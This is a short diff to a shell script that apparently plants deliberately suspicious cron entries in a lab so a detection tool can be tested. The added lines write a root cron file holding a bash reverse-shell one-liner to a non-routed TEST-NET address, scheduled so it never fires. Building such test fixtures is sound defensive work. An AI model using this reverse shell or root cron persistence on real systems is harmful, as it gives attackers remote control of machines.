@@ -105,6 +105,13 @@ plant_cron() {
     chmod 644 "/etc/cron.d/$MARK"
     record "file /etc/cron.d/$MARK"
 
+    # Calls back to TEST-NET-1 (192.0.2.1, never routed) and never fires.
+    say CRON_SUSPICIOUS_COMMAND "/etc/cron.d/$MARK-revshell /dev/tcp to TEST-NET (never fires)"
+    printf '# %s\n%s root bash -c '"'"'bash -i >& /dev/tcp/192.0.2.1/4444 0>&1'"'"'\n' \
+        "$MARK" "$NEVER" > "/etc/cron.d/$MARK-revshell"
+    chmod 644 "/etc/cron.d/$MARK-revshell"
+    record "file /etc/cron.d/$MARK-revshell"
+
     say CRON_ROOT_EXEC "crontab for $LAB_USER using sudo (never fires)"
     printf '# %s\n%s sudo /usr/bin/true\n' "$MARK" "$NEVER" | crontab -u "$LAB_USER" -
     record "crontab $LAB_USER"
